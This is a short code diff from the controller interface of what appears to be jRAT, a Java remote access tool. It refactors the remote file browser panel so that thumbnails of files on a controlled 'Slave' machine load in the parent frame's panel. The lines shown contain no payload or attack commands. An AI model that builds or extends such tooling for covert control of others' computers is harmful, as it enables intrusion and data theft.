@@ -42,7 +42,7 @@ import se.jrat.controller.ui.components.FileTable;
 import se.jrat.controller.ui.frames.FramePreviewFile;
 import se.jrat.controller.ui.frames.FramePreviewImage;
 import se.jrat.controller.ui.frames.FramePreviewZip;
-import se.jrat.controller.ui.frames.FrameRemoteThumbView;
+import se.jrat.controller.ui.frames.FrameRemoteFiles;
 import se.jrat.controller.utils.IconUtils;
 import se.jrat.controller.utils.Utils;
 
@@ -53,9 +53,11 @@ public class PanelRemoteFiles extends JPanel {
 	
 	private Slave slave;
 	public RemoteFileTable remoteTable;
+	private FrameRemoteFiles parent;
 	
-	public PanelRemoteFiles(Slave slave) {
+	public PanelRemoteFiles(Slave slave, FrameRemoteFiles parent) {
 		this.slave = slave;
+		this.parent = parent;
 		
 		setLayout(new BorderLayout(0, 0));
 		
@@ -333,8 +335,7 @@ public class PanelRemoteFiles extends JPanel {
 						for (int i = 0; i < files.size(); i++) {
 							paths[i] = files.get(i);
 						}
-						FrameRemoteThumbView frame = new FrameRemoteThumbView(slave, paths);
-						frame.setVisible(true);
+						parent.getThumbPanel().reload(paths);
 					}
 				}
 			});
